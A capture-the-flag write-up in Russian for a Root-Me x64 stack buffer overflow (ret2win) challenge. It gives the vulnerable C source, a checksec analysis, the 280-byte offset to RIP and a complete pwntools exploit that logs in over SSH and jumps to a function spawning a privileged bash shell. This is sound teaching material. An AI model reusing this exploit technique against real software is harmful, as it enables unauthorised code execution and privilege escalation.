classical ret2win

Easy PWN by pr1ncipL£
Описание задания

Задача ELF-x64-Stack-buffer-overflow-basic — классический ret2win. На сервере запущен 64-битный ELF-бинарь с уязвимостью переполнения буфера стека через scanf("%s", buffer). В бинаре присутствует win-функция callMeMaybe(), запускающая /bin/bash -p через execve. Цель — перехватить RIP и направить выполнение туда.

Исходный код (ch35.c)
C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

/*
gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack
*/

void callMeMaybe(){
    char *argv[] = { "/bin/bash", "-p", NULL };
    execve(argv[0], argv, NULL);
}

int main(int argc, char **argv){

    char buffer[256];
    int len, i;

    scanf("%s", buffer);
    len = strlen(buffer); 

    printf("Hello %s\n", buffer);

    return 0;
}

Компилируется с флагами -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack — канарейки нет, PIE отключён, Full RELRO включён, стек неисполняемый. Идеальные условия для ret2win.

Анализ бинаря (checksec)
ЗащитаСтатусЗначение
Arch amd64-64-little64-bit, little endian
RELRO Full RELRO GOT защищён, но не нужен
Stack No canary overflow свободен
NX Enabled shellcode на стеке не работает
PIE No PIE (0x400000)адреса .text фиксированы
StrippedNo символы присутствуют

NX включён — шеллкод нельзя. Но PIE выключен, значит адрес callMeMaybe всегда одинаков, как на сервере, так и локально (при условии одинакового бинаря).

Процесс эксплуатации
1

Определение offset до RIP

Буфер char buffer[256], но между ним и сохранённым RIP на стеке ещё лежит выравнивание и сохранённый RBP (8 байт). Итоговый offset экспериментально: 280 байт.

rbp-0x108
buffer[256] ← начало ввода
...
alignment / padding (24 байта)
rbp+0x00
saved RBP (8 байт)
rbp+0x08
saved RIP ← перезаписываем
2

Получение правильного адреса

Локальный бинарь отличается от серверного — адрес callMeMaybe разный. Решение: скачать бинарь с сервера через SSH и спарсить адрес прямо в скрипте.

[+] Downloading '/challenge/app-systeme/ch35/ch35' to './ch35': Done
0x4005e7 ← адрес callMeMaybe на сервере
3

Финальный эксплойт

Python
from pwn import *

s = ssh(user='app-systeme-ch35',
        host='challenge03.root-me.org',
        port=2223,
        password='app-systeme-ch35')

# скачиваем серверный бинарь — адреса совпадут точно
s.download_file('/challenge/app-systeme/ch35/ch35', './ch35')

elf = ELF('./ch35')
callMeMaybe = elf.symbols['callMeMaybe']  # win function

print(hex(callMeMaybe))  # 0x4005e7

p = s.run('/challenge/app-systeme/ch35/ch35')

payload  = b'A' * 280       # заполняем до RIP
payload += p64(callMeMaybe)  # прыгаем в win

p.sendline(payload)
p.interactive()
